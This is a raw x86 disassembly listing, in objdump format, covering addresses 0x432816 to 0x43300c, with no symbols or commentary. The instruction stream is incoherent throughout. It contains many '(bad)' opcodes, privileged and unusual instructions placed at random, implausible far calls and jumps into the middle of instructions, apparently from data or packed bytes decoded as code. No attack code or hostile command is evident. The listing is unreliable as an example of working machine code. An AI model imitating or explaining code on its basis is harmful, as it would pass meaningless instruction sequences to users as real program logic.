  432816:	ret    0x8b
  432819:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43281f:	mov    edi,esp
  432821:	hlt    
  432822:	test   ecx,esi
  432824:	clc    
  432825:	or     BYTE PTR [ebp+0x7],al
  432828:	xor    al,0xc1
  43282a:	pushf  
  43282b:	jb     0x432860
  43282d:	add    BYTE PTR [eax-0x3f],al
  432830:	inc    eax
  432831:	daa    
  432832:	inc    ebp
  432833:	inc    ebp
  432834:	xor    eax,0x7f80803
  432839:	dec    ebp
  43283a:	call   0xc09:0x39f83203
  432841:	or     BYTE PTR [edx],al
  432843:	inc    ebp
  432844:	sub    al,0x35
  432846:	inc    ebp
  432847:	or     BYTE PTR ds:0x74d0807,dh
  43284d:	lea    ebx,[edx-0x748dcdff]
  432853:	add    BYTE PTR [eax*2-0x74b21438],cl
  43285a:	mov    edx,DWORD PTR [eax]
  43285c:	cld    
  43285d:	dec    ebp
  43285e:	push   ebx
  43285f:	sub    edx,DWORD PTR [ecx-0x75]
  432862:	add    eax,0xf172fc
  432867:	or     BYTE PTR [ebp+0x7],cl
  43286a:	add    eax,ecx
  43286c:	or     al,0x72
  43286e:	add    DWORD PTR [eax],eax
  432870:	mov    ebx,0x29c2c1
  432875:	inc    ebp
  432876:	mov    eax,DWORD PTR [ebx]
  432878:	cmp    eax,0x3004d1c
  43287e:	xbegin 0x66c8b478
  432884:	clc    
  432885:	or     BYTE PTR [ebp+0x45],al
  432888:	xor    al,0x35
  43288a:	pushf  
  43288b:	or     BYTE PTR [ebx+0x454d1007],cl
  432891:	lea    eax,[ebp+0x33727501]
  432897:	add    cl,ch
  432899:	inc    ebp
  43289a:	add    bl,ch
  43289c:	add    BYTE PTR [ebx+0x45850845],cl
  4328a2:	je     0x43282f
  4328a4:	push   ebx
  4328a5:	or     al,0x85
  4328a7:	dec    ebp
  4328a8:	std    
  4328a9:	mov    bh,bh
  4328ab:	mov    BYTE PTR [ebp-0x75],al
  4328ae:	mov    edi,eax
  4328b0:	or     al,0x89
  4328b2:	inc    ebp
  4328b3:	clc    
  4328b4:	mov    esp,esp
  4328b6:	hlt    
  4328b7:	call   DWORD PTR [edi-0x37]
  4328ba:	push   ebx
  4328bb:	or     al,0x51
  4328bd:	push   ebp
  4328be:	xor    ebp,esp
  4328c0:	mov    esi,0x457251
  4328c5:	xor    eax,0xc7459cc6
  4328ca:	mov    edi,eax
  4328cc:	or     al,0x85
  4328ce:	add    al,bh
  4328d0:	inc    eax
  4328d2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4328d6:	or     ah,bh
  4328d8:	inc    eax
  4328d9:	push   ebx
  4328da:	jmp    0x43292d
  4328dc:	mov    eax,DWORD PTR ds:0xe8720c
  4328e2:	mov    DWORD PTR [ebp-0x8],eax
  4328e5:	jne    0x43292c
  4328e7:	jmp    0x432874
  4328e9:	mov    ebp,DWORD PTR [eax]
  4328eb:	clc    
  4328ec:	retf   0xff53
  4328ef:	push   ecx
  4328f0:	mov    DWORD PTR ds:0x757210,eax
  4328f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4328f9:	sub    esp,DWORD PTR [ebx-0x77]
  4328fc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432903:	or     ah,bh
  432905:	pop    es
  432906:	ds call 0x8f0:0x8b8b32ff
  43290e:	(bad)  
  43290f:	dec    ebp
  432910:	(bad)  
  432911:	mov    bh,bh
  432913:	jmp    0x432901
  432915:	leave  
  432916:	jne    0x432920
  432918:	call   0x302272
  43291d:	in     al,dx
  43291e:	dec    ebp
  43291f:	add    dh,BYTE PTR [ebx]
  432921:	add    BYTE PTR [ebx],al
  432923:	inc    ebp
  432924:	cmp    esi,DWORD PTR ds:0xc78b9c74
  43292a:	or     al,0xf0
  43292c:	add    BYTE PTR [ebp+0x458bf845],al
  432932:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432938:	adc    al,0x7
  43293a:	enter  0x9fc0,0xa5
  43293e:	rol    BYTE PTR [eax],0x5e
  432941:	mov    ecx,ecx
  432943:	or     al,0xc
  432945:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  43294c:	jmp    0x43294d
  43294e:	push   ebp
  43294f:	mov    esp,ebp
  432951:	cld    
  432952:	inc    ebp
  432953:	inc    ebp
  432954:	or     DWORD PTR [ecx+0x457dec10],0x0
  43295b:	push   esi
  43295c:	push   esi
  43295d:	mov    edi,0x7af080f
  432962:	add    bh,al
  432964:	test   DWORD PTR [edx+0x3a7320f],ebx
  43296a:	add    BYTE PTR [ecx+0x4540100f],cl
  432970:	mov    ebp,eax
  432972:	mov    ebp,edi
  432974:	lock call edx
  432977:	fcom   DWORD PTR [ebp+0x45]
  43297a:	mov    eax,0x148a8b
  43297f:	push   ecx
  432980:	enter  0xc145,0x83
  432984:	cmp    ecx,DWORD PTR [eax]
  432986:	add    BYTE PTR [ebp+0x4d],al
  432989:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  43298f:	call   0xffa324fe
  432994:	cmp    eax,DWORD PTR [ebp-0xc]
  432997:	jmp    DWORD PTR [eax+edx*1-0x4e]
  43299b:	push   ebp
  43299c:	(bad)
  43299f:	std    
  4329a0:	lock push DWORD PTR [edi+0x5d08fcdb]
  4329a7:	inc    ebp
  4329a8:	(bad)  
  4329a9:	call   0xff7d2639
  4329ae:	add    al,BYTE PTR [ebp+0x37]
  4329b1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  4329b7:	jne    0x4329b9
  4329b9:	(bad)  
  4329ba:	cmp    edi,esp
  4329bc:	jne    0x4329ef
  4329be:	mov    edi,edi
  4329c0:	or     BYTE PTR [ebx-0x307f0b49],cl
  4329c6:	pop    ds
  4329c7:	into   
  4329c8:	je     0x43298b
  4329ca:	mov    ebx,DWORD PTR [esi]
  4329cc:	or     BYTE PTR [ebp-0x49],al
  4329cf:	mov    esp,DWORD PTR [esi-0x77]
  4329d2:	mov    esi,0x451f0c
  4329d7:	mov    eax,DWORD PTR [eax]
  4329d9:	or     al,0x66
  4329db:	sar    bl,0x3b
  4329de:	xor    esi,DWORD PTR [ebp+0x66]
  4329e1:	xor    ecx,edi
  4329e3:	pop    edi
  4329e4:	adc    bl,BYTE PTR [ebx+0x7c]
  4329e7:	ret    0xff
  4329ea:	cld    
  4329eb:	inc    ebp
  4329ec:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4329f2:	cld    
  4329f3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4329fa:	push   0xffffff83
  4329fc:	pop    edi
  4329fd:	or     BYTE PTR [ebp+0x53],dh
  432a00:	xorps  xmm1,xmm2
  432a03:	test   BYTE PTR [eax+eax*1],bh
  432a06:	add    BYTE PTR [eax],al
  432a08:	adc    eax,eax
  432a0a:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  432a12:	jmp    DWORD PTR [eax]
  432a14:	ror    al,0x5e
  432a17:	inc    ebp
  432a18:	leave  
  432a19:	xor    ecx,DWORD PTR [eax]
  432a1b:	and    DWORD PTR [ebx-0x3ec50708],ecx
  432a21:	add    ch,al
  432a23:	xor    edi,edi
  432a25:	xor    DWORD PTR [ebx],0x66003300
  432a2b:	mov    DWORD PTR [ebp-0xc],ecx
  432a2e:	pcmpgtw mm0,mm0
  432a31:	add    dl,ah
  432a33:	leave  
  432a34:	mov    edi,DWORD PTR [esi-0x7d]
  432a37:	push   ax
  432a39:	dec    ebp
  432a3a:	mov    esi,DWORD PTR [ebx-0x75]
  432a3d:	lea    ebp,[eax-0x7c010000]
  432a43:	xor    eax,DWORD PTR [eax]
  432a45:	sysret 
  432a47:	dec    ebp
  432a48:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432a4f:	push   WORD PTR [ecx+0x8]
  432a53:	jne    0x432a16
  432a55:	ud0    ecx,DWORD PTR [ecx]
  432a58:	mov    edi,DWORD PTR [edx]
  432a5a:	lods   al,BYTE PTR ds:[esi]
  432a5b:	add    BYTE PTR [eax],al
  432a5d:	data16 (bad) 
  432a5f:	iret   
  432a60:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432a67:	cli    
  432a68:	inc    ebp
  432a69:	cmp    al,0x8d
  432a6b:	add    BYTE PTR [esi+0x2d],ah
  432a6e:	inc    ebp
  432a6f:	pop    ebp
  432a70:	lea    ecx,[edi]
  432a72:	mov    dl,bh
  432a74:	add    BYTE PTR [edi],cl
  432a76:	mov    DWORD PTR [eax+eax*8],edi
  432a79:	mov    ebx,0x3b87
  432a7e:	add    BYTE PTR [ebx],ch
  432a80:	inc    ebp
  432a81:	data16 (bad) 
  432a83:	clc    
  432a84:	int3   
  432a85:	cmp    eax,DWORD PTR [eax]
  432a87:	je     0x432a12
  432a89:	push   0xffffffc8
  432a8b:	pop    edi
  432a8c:	xchg   DWORD PTR [ebp+0x0],eax
  432a8f:	data16 add BYTE PTR [ebp+0x45],cl
  432a93:	lea    cx,[ebp+0x10]
  432a97:	jb     0x432a99
  432a99:	jmp    0x432a24
  432a9b:	call   eax
  432a9d:	clc    
  432a9e:	xchg   DWORD PTR [edi+0x1],edi
  432aa1:	mov    eax,DWORD PTR [eax]
  432aa3:	or     BYTE PTR [ebp-0x49],al
  432aa6:	lea    eax,[eax+0x74003154]
  432aac:	push   edi
  432aad:	inc    edx
  432aae:	jge    0x432aaf
  432ab0:	mov    DWORD PTR [edi],ecx
  432ab2:	fdiv   DWORD PTR [edi-0x6]
  432ab5:	inc    DWORD PTR [eax]
  432ab7:	xor    edx,DWORD PTR [eax+0x5f]
  432aba:	xchg   DWORD PTR [ebx+0x1],ebx
  432abd:	ret    0x0
  432ac0:	xor    BYTE PTR [ebp-0x51],cl
  432ac3:	cmp    edi,0xf0ff8900
  432ac9:	data16 ror al,0x84
  432acd:	rol    BYTE PTR [eax],0x3b
  432ad0:	add    al,dh
  432ad2:	dec    eax
  432ad3:	xchg   esp,eax
  432ad4:	push   ebx
  432ad5:	jmp    0x432a62
  432ad7:	push   ebp
  432ad8:	add    esp,ebp
  432ada:	add    ebp,esp
  432adc:	mov    edx,DWORD PTR [edi+0x24]
  432adf:	clc    
  432ae0:	dec    esi
  432ae1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ae7:	cmp    BYTE PTR [ebx],al
  432ae9:	jne    0x432a74
  432aeb:	xor    esp,eax
  432aed:	jmp    0x462c70
  432af2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432af5:	jne    0x432aeb
  432af7:	call   0xffcd2851
  432afc:	clc    
  432afd:	xchg   edi,eax
  432afe:	sti    
  432aff:	add    DWORD PTR [ebx],eax
  432b01:	add    BYTE PTR [ebp+0x47],bl
  432b04:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432b0a:	pop    ebp
  432b0b:	mov    DWORD PTR [esi-0x48],esi
  432b0e:	jmp    0x432b57
  432b10:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432b16:	(bad)  
  432b18:	cmp    al,0x0
  432b1a:	cmp    eax,DWORD PTR [ebp+0x18]
  432b1d:	lea    ebx,[ebp-0x56]
  432b20:	jle    0x432b22
  432b22:	jae    0x432aad
  432b24:	mov    eax,esp
  432b26:	call   0xb900:0x8b005587
  432b2d:	inc    ebp
  432b2e:	push   ebp
  432b2f:	lea    ecx,[ebp-0x27ff4f12]
  432b35:	mov    eax,edi
  432b37:	int3   
  432b38:	push   ebp
  432b39:	xchg   edi,eax
  432b3b:	add    esp,ebp
  432b3d:	add    BYTE PTR [eax],al
  432b3f:	inc    ebp
  432b40:	add    BYTE PTR [ebp+0x8b3255],cl
  432b46:	cld    
  432b47:	mov    DWORD PTR [edx],edi
  432b49:	aam    0x75
  432b4b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432b51:	mov    DWORD PTR [ebx-0x50],edx
  432b54:	test   BYTE PTR [ebp-0x1],0xe8
  432b58:	mov    eax,DWORD PTR [eax]
  432b5a:	hlt    
  432b5b:	add    al,al
  432b5d:	mov    eax,DWORD PTR ds:0x890045a8
  432b63:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432b69:	inc    DWORD PTR [eax*2+0xf75854d]
  432b70:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432b76:	call   0x729988b7
  432b7b:	je     0x432bdb
  432b7d:	js     0x432bde
  432b7f:	lock ret 0x7e
  432b83:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432b89:	mov    edi,edi
  432b8b:	sbb    al,bl
  432b8d:	clc    
  432b8e:	add    BYTE PTR [ebp-0x73],bh
  432b91:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432b97:	ror    BYTE PTR [eax],1
  432b99:	dec    ebp
  432b9a:	xchg   ebp,eax
  432b9b:	mov    edi,edi
  432b9d:	in     al,0x8b
  432b9f:	jge    0x432b2a
  432ba1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432ba7:	clc    
  432ba8:	pop    esi
  432ba9:	fist   DWORD PTR [ebp+0x5d398b5d]
  432baf:	clc    
  432bb0:	add    al,0x6e
  432bb2:	mov    eax,DWORD PTR [ebx]
  432bb4:	mov    BYTE PTR [ebp+0x0],dl
  432bb7:	mov    edx,DWORD PTR [ebx-0x20]
  432bba:	adc    esi,DWORD PTR [edi+0x5e005f3a]
  432bc0:	add    eax,0x3b3b73
  432bc5:	adc    al,0x89
  432bc7:	pop    eax
  432bc8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432bcc:	ret    0xf08
  432bcf:	cmp    al,0x2
  432bd1:	mov    DWORD PTR [edx],edi
  432bd3:	cld    
  432bd4:	add    BYTE PTR [ebp+0x66],dl
  432bd7:	add    eax,ebx
  432bd9:	add    esp,eax
  432bdb:	sub    eax,eax
  432bdd:	or     BYTE PTR [ecx-0x77f474bb],cl
  432be3:	add    BYTE PTR [eax],al
  432be5:	mov    DWORD PTR [ebx-0x24],ebx
  432be8:	push   edi
  432be9:	push   ebp
  432bea:	clc    
  432beb:	add    DWORD PTR [esi+0x1b0100],0x45
  432bf2:	out    0xff,eax
  432bf4:	add    edx,DWORD PTR [eax]
  432bf6:	jmp    0x432be0
  432bf8:	cmp    ch,0x45
  432bfb:	(bad)  
  432bfc:	jmp    0x40c8b44e
  432c01:	je     0x432b8d
  432c03:	mov    eax,DWORD PTR [eax-0x10c78304]
  432c09:	inc    ebp
  432c0a:	add    BYTE PTR [ebx-0x770375],al
  432c10:	add    ah,ch
  432c12:	add    edx,esp
  432c14:	pop    edi
  432c15:	pop    ebp
  432c16:	push   ebp
  432c17:	inc    ebx
  432c18:	in     al,dx
  432c19:	pop    ebp
  432c1a:	in     al,dx
  432c1b:	cmp    edx,DWORD PTR [edi-0x8]
  432c1e:	xor    eax,0x895b9c94
  432c23:	leave  
  432c24:	call   0x8998732d
  432c29:	in     al,dx
  432c2a:	in     al,0x45
  432c2c:	dec    ebp
  432c2d:	push   esi
  432c2e:	test   DWORD PTR [eax+0xfb010f],esi
  432c34:	add    BYTE PTR [eax+0xc018b],dh
  432c3a:	leave  
  432c3b:	inc    ebp
  432c3c:	test   al,ch
  432c3e:	add    dh,bh
  432c40:	add    bh,bh
  432c42:	dec    ebp
  432c43:	push   cs
  432c44:	mov    DWORD PTR [ecx],eax
  432c46:	hlt    
  432c47:	push   es
  432c48:	dec    ebp
  432c49:	leave  
  432c4a:	mov    DWORD PTR [eax],ecx
  432c4c:	clc    
  432c4d:	cmovge eax,ecx
  432c50:	mov    ecx,0x85c2f0
  432c56:	clc    
  432c57:	pop    DWORD PTR [ebp+0x1]
  432c5a:	push   ebx
  432c5b:	add    BYTE PTR [ebp-0x15],bh
  432c5e:	push   esi
  432c5f:	xor    eax,0x898a45
  432c64:	cld    
  432c65:	add    BYTE PTR [ebp+0x0],al
  432c68:	cmp    esp,DWORD PTR [esi-0x64]
  432c6b:	add    DWORD PTR [esi+0x78308c1],edi
  432c71:	add    ah,BYTE PTR [esi-0x49]
  432c74:	int    0xbb
  432c76:	mov    ecx,DWORD PTR [edi+0xc]
  432c79:	add    dh,al
  432c7b:	cmp    ecx,ebx
  432c7d:	jne    0x432c47
  432c7f:	xor    ecx,DWORD PTR [ebp+0x66]
  432c82:	jmp    0xca2c88
  432c87:	add    DWORD PTR [ebp+0x0],eax
  432c8a:	mov    eax,ebx
  432c8c:	or     al,0x8b
  432c8e:	(bad)  
  432c8f:	mov    ecx,esi
  432c91:	mov    BYTE PTR [eax+eax*1+0x664c134],cl
  432c98:	mov    eax,edi
  432c9a:	or     BYTE PTR [edx],cl
  432c9c:	shl    cl,cl
  432c9e:	icebp  
  432c9f:	add    BYTE PTR [ebp+0x39],0x8b
  432ca3:	or     BYTE PTR [edx+eax*2],cl
  432ca6:	(bad)  
  432ca7:	or     cl,dh
  432ca9:	stc    
  432caa:	shl    DWORD PTR [ebp-0x30],0xc6
  432cae:	xor    al,0x0
  432cb0:	inc    ebp
  432cb1:	xchg   BYTE PTR [ebx],al
  432cb3:	add    esp,edi
  432cb5:	add    BYTE PTR [ebp-0x39],cl
  432cb8:	mov    al,bl
  432cba:	test   DWORD PTR [ebx+0x1c348375],ecx
  432cc0:	sub    al,0xbf
  432cc2:	jmp    0x432c49
  432cc4:	mov    edi,eax
  432cc6:	lock jge 0x432cba
  432cc9:	lea    esi,[edx-0x74bad501]
  432ccf:	mov    ebp,esp
  432cd1:	or     cl,dh
  432cd3:	leave  
  432cd4:	add    al,BYTE PTR [eax+eax*4-0x37ff9a00]
  432cdb:	dec    ebp
  432cdc:	dec    ebp
  432cdd:	test   DWORD PTR [ebx],eax
  432cdf:	paddb  mm6,mm0
  432ce2:	add    DWORD PTR [eax],eax
  432ce4:	dec    ebp
  432ce5:	mov    ecx,DWORD PTR [ebx-0x65b217f0]
  432ceb:	mov    esi,DWORD PTR [edx]
  432ced:	or     al,0x2b
  432cef:	dec    ebp
  432cf0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432cf6:	mov    esp,eax
  432cf8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432cff:	mov    DWORD PTR [ebx],ebp
  432d01:	call   0xc76b631
  432d06:	mov    DWORD PTR [ebp+0x10],ecx
  432d09:	(bad)  
  432d0a:	push   0x8b85ff10
  432d0f:	clc    
  432d10:	or     al,0x53
  432d12:	(bad)  
  432d13:	push   ecx
  432d14:	retf   
  432d15:	mov    ebx,0xff4d8dc8
  432d1a:	mov    DWORD PTR [ebp+0x8],eax
  432d1d:	xor    eax,DWORD PTR [ebp-0x75]
  432d20:	cmp    ebp,DWORD PTR [ebx]
  432d22:	lsl    ebx,WORD PTR [edi-0x8]
  432d26:	call   DWORD PTR [ebx-0x741bff75]
  432d2c:	(bad)  
  432d2d:	or     al,0x5b
  432d2f:	dec    ebp
  432d30:	or     BYTE PTR [ebx],dh
  432d32:	inc    ebp
  432d33:	xor    esi,DWORD PTR ds:0x708088d
  432d39:	in     eax,0x9a
  432d3b:	add    BYTE PTR [edx],dh
  432d3d:	inc    ebp
  432d3e:	pop    edi
  432d3f:	xor    eax,edx
  432d41:	test   DWORD PTR [eax],0x81108b8b
  432d47:	dec    ebp
  432d48:	sub    al,0x33
  432d4a:	add    BYTE PTR [ebx],dh
  432d4c:	push   esi
  432d4d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432d53:	mov    edi,eax
  432d55:	or     BYTE PTR [ebp+0x45],al
  432d58:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432d5e:	xor    eax,0xc7069cc9
  432d63:	inc    ebp
  432d64:	cld    
  432d65:	cmp    DWORD PTR [ebp+0x454df817],eax
  432d6b:	cmp    BYTE PTR ds:0xc7669c53,0xd1
  432d72:	in     al,0x4d
  432d74:	xchg   BYTE PTR [eax-0x3dbaac08],al
  432d7a:	aad    0xe9
  432d7c:	xlat   BYTE PTR ds:[ebx]
  432d7d:	rol    bh,cl
  432d7f:	mov    edx,esp
  432d81:	or     BYTE PTR [ebp+0x4588f84d],al
  432d87:	mov    ecx,DWORD PTR [eax]
  432d89:	or     BYTE PTR [eax],al
  432d8b:	push   ebp
  432d8c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432d92:	dec    ebp
  432d93:	enter  0xceba,0x8
  432d97:	retf   0x1807
  432d9a:	ret    0x9a4d
  432d9d:	mov    esi,DWORD PTR [edx]
  432d9f:	or     al,0x33
  432da1:	into   
  432da2:	add    edx,esi
  432da4:	add    ecx,edx
  432da6:	bswap  eax
  432da8:	ror    esi,0x98
  432dab:	dec    ebp
  432dac:	add    cl,ch
  432dae:	mov    edi,edi
  432db0:	hlt    
  432db1:	inc    esi
  432db3:	inc    ebp
  432db4:	ret    0x4533
  432db7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432dbd:	or     BYTE PTR [ebx],dh
  432dbf:	dec    ebp
  432dc0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432dc6:	jne    0xff8d2d8d
  432dcc:	inc    ebp
  432dcd:	inc    ebp
  432dce:	mov    esi,DWORD PTR [ebx]
  432dd0:	clc    
  432dd1:	pop    esi
  432dd2:	ret    0xcaeb
  432dd5:	mov    eax,esi
  432dd7:	call   0x520481aa
  432ddc:	dec    ebp
  432ddd:	add    eax,0xf8728b
  432de2:	adc    eax,0xce0ccac9
  432de7:	push   ebp
  432de8:	ret    0xc6ec
  432deb:	in     al,dx
  432dec:	call   0x33437af5
  432df1:	push   edi
  432df2:	add    edi,eax
  432df4:	xor    eax,eax
  432df6:	jmp    0x432e3d
  432df8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432dfe:	add    eax,edi
  432e00:	shr    eax,cl
  432e02:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432e08:	mov    esi,DWORD PTR [esp+ebp*8]
  432e0b:	pushf  
  432e0c:	ret    0x84c7
  432e0f:	fcomp  DWORD PTR [edx-0x7607cd7b]
  432e15:	inc    ebp
  432e16:	in     al,dx
  432e17:	xor    eax,0xc78b9c45
  432e1c:	cld    
  432e1d:	fmul   st(2),st
  432e1f:	sbb    dl,al
  432e21:	jmp    0x9c3b:0x364d45c1
  432e28:	jbe    0x432df1
  432e2a:	mov    esp,eax
  432e2c:	clc    
  432e2d:	add    BYTE PTR [ebp+0x0],cl
  432e30:	mov    ecx,ecx
  432e32:	lea    eax,[ebp-0x5]
  432e35:	mov    edi,edi
  432e37:	call   0x51ce8181
  432e3c:	hlt    
  432e3d:	xor    eax,edx
  432e3f:	mov    esi,0x9a7284
  432e44:	xor    cl,dl
  432e46:	mov    esi,eax
  432e48:	hlt    
  432e49:	into   
  432e4a:	inc    ebp
  432e4b:	scas   eax,DWORD PTR es:[edi]
  432e4c:	mov    ebp,ecx
  432e4e:	cld    
  432e4f:	add    dl,cl
  432e51:	add    dl,al
  432e53:	inc    ebp
  432e54:	shr    DWORD PTR [ebx],0x4d
  432e57:	xor    edi,DWORD PTR [ebx]
  432e59:	mov    DWORD PTR [edi],ecx
  432e5b:	clc    
  432e5c:	dec    esi
  432e5d:	inc    ebp
  432e5e:	dec    DWORD PTR [ebx-0x3d2b1775]
  432e64:	ret    0xc6ca
  432e67:	mov    BYTE PTR [ebp-0x32],0x53
  432e6b:	scas   eax,DWORD PTR es:[edi]
  432e6c:	inc    ebp
  432e6d:	jmp    0x432ea5
  432e6f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432e76:	pop    ebx
  432e77:	xor    ecx,DWORD PTR [ebp+0x3]
  432e7a:	mov    eax,DWORD PTR [ebx]
  432e7c:	clc    
  432e7d:	test   edx,ecx
  432e7f:	mov    ecx,esi
  432e81:	cld    
  432e82:	call   0x8ab773cc
  432e87:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432e8d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432e93:	fdiv   QWORD PTR [ebx]
  432e95:	retf   0xce89
  432e98:	in     al,0xc1
  432e9a:	inc    ebp
  432e9b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432ea1:	into   
  432ea2:	mov    dh,0xc1
  432ea5:	call   0x8c17742e
  432eaa:	(bad)  
  432eab:	cld    
  432eac:	mov    ecx,DWORD PTR [ebp-0x14]
  432eaf:	xor    eax,ecx
  432eb1:	lea    eax,[ebp+0x8]
  432eb4:	mov    esi,DWORD PTR [edx-0x4]
  432eb7:	add    dl,al
  432eb9:	inc    ebp
  432eba:	mov    esp,0x32d89a8b
  432ebf:	dec    ebp
  432ec0:	mov    esi,DWORD PTR [ebx]
  432ec2:	cld    
  432ec3:	xor    eax,edx
  432ec5:	sub    esp,DWORD PTR [esi-0x75]
  432ec8:	int    0xec
  432eca:	sub    ecx,eax
  432ecc:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432ed2:	mov    esi,esp
  432ed4:	call   0x34177c5d
  432ed9:	inc    DWORD PTR [ebx]
  432edb:	mov    edi,DWORD PTR [ebx]
  432edd:	cld    
  432ede:	jne    0x432f2d
  432ee0:	mov    esi,DWORD PTR [ebx]
  432ee2:	aam    0x8d
  432ee4:	dec    ebp
  432ee5:	or     BYTE PTR [ebx],dh
  432ee7:	jb     0x432eec
  432ee9:	add    BYTE PTR [edi+0x45],bl
  432eec:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432ef3:	xor    ebp,esp
  432ef5:	xor    eax,edi
  432ef7:	sub    edi,esp
  432ef9:	mov    eax,DWORD PTR [ebp+0x34c8f8f4]
  432eff:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432f06:	inc    ebp
  432f07:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432f0d:	clc    
  432f0e:	mov    eax,edi
  432f10:	nop
  432f11:	fadd   QWORD PTR [eax]
  432f13:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432f19:	jmp    0x432ea4
  432f1b:	mov    eax,DWORD PTR [ecx]
  432f1d:	fadd   DWORD PTR [eax]
  432f1f:	inc    ebp
  432f20:	or     DWORD PTR [ebx],esi
  432f22:	dec    eax
  432f23:	add    edx,DWORD PTR [ebx-0x2d]
  432f26:	dec    ebp
  432f27:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432f2d:	inc    ebp
  432f2e:	push   ebx
  432f2f:	mov    dl,BYTE PTR [ecx-0xd]
  432f32:	xor    ecx,DWORD PTR [ebp-0x45]
  432f35:	(bad)  
  432f37:	rol    BYTE PTR [eax],0xc1
  432f3a:	ret    
  432f3b:	inc    ebp
  432f3c:	inc    ebp
  432f3d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432f43:	xor    eax,ebx
  432f45:	add    eax,DWORD PTR [ebp+0x23]
  432f48:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  432f4e:	cmp    edi,0xc
  432f51:	dec    ebp
  432f52:	inc    ebp
  432f53:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  432f59:	inc    ebp
  432f5a:	mov    esi,DWORD PTR [ebx]
  432f5c:	clc    
  432f5d:	lea    eax,[ebp+0x45725407]
  432f63:	add    BYTE PTR [ebp+eax*2-0x75],dh
  432f67:	xor    edi,DWORD PTR [eax]
  432f69:	mov    ecx,0xff8b8d4d
  432f6e:	push   esp
  432f6f:	enter  0x4df7,0x23
  432f73:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  432f79:	mov    eax,DWORD PTR [ebx]
  432f7b:	loopne 0x432f68
  432f7d:	ret    0xc68b
  432f80:	push   esp
  432f81:	enter  0x9745,0x8b
  432f85:	inc    ebp
  432f86:	cld    
  432f87:	mov    eax,edi
  432f89:	clc    
  432f8a:	ret    
  432f8b:	ret    0xc645
  432f8e:	mov    esi,DWORD PTR [ebx]
  432f90:	cld    
  432f91:	pop    esi
  432f92:	mov    ebx,0x83458bc3
  432f98:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  432f9c:	dec    ebp
  432f9d:	xor    eax,0xba039c33
  432fa2:	mov    DWORD PTR [ebp+0x55d8f889],eax
  432fa8:	inc    ebp
  432fa9:	mov    edi,DWORD PTR [ebx]
  432fab:	adc    al,0x9c
  432fad:	inc    ebp
  432fae:	(bad)  
  432faf:	mov    ebx,eax
  432fb1:	adc    al,0x85
  432fb3:	cmp    al,0x1
  432fb6:	inc    ebp
  432fb7:	add    BYTE PTR [ecx],bh
  432fb9:	dec    ebp
  432fba:	pushf  
  432fbb:	mov    ebp,ecx
  432fbd:	mov    eax,DWORD PTR [ebx]
  432fbf:	nop
  432fc0:	add    BYTE PTR [eax],al
  432fc2:	inc    ebp
  432fc3:	mov    esi,DWORD PTR [ebx]
  432fc5:	add    eax,DWORD PTR [ebx]
  432fc7:	cmp    al,0x89
  432fc9:	mov    esp,esi
  432fcb:	clc    
  432fcc:	inc    ebp
  432fcd:	inc    ebp
  432fce:	add    edx,DWORD PTR [esi+0xc]
  432fd1:	mov    edi,0x7ff0845
  432fd6:	in     al,dx
  432fd7:	(bad)  
  432fd8:	jne    0x432f74
  432fda:	mov    esi,DWORD PTR [edx]
  432fdc:	clc    
  432fdd:	add    ebp,DWORD PTR [esi]
  432fdf:	mov    edi,edi
  432fe1:	in     al,dx
  432fe2:	mov    DWORD PTR [ebp-0x10],eax
  432fe5:	xor    eax,DWORD PTR [ebp+0x3]
  432fe8:	cmp    eax,0x8bf49c89
  432fed:	inc    ebp
  432fee:	fmul   DWORD PTR [ebx-0x173caf39]
  432ff4:	lea    ecx,[ecx+0x45e8d4bc]
  432ffa:	clc    
  432ffb:	mov    edi,edi
  432ffd:	cmp    BYTE PTR [ebp+0x4d],al
  433000:	test   DWORD PTR [eax+0x74],ecx
  433003:	inc    ecx
  433004:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43300a:	ret    
  43300b:	inc    eax
  43300c:	dec    DWORD PTR [ebx+0x4945f8f0]
